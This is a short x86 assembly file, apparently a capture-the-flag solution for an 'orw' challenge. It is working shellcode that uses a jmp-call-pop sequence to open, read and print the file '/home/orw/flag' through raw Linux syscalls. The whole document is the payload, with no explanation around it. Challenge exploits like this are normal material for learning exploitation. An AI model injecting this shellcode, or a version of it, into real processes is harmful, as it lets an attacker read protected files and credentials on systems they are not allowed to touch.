[BITS 32]
global _start
section .text
_start:
    jmp FILENAME

ORW:
    xor ecx,ecx
    xor edx,edx
    pop ebx
    mov eax,5
    int 0x80
   
    push eax
    pop  ebx
    push ebp
    pop  ecx
    mov  edx,0x30
    mov  eax,3
    int  0x80

    mov ebx,1
    mov edx,0x30
    mov eax,4
    int 0x80

    mov eax,1
    int 0x80

FILENAME:
    call ORW
    db "/home/orw/flag"

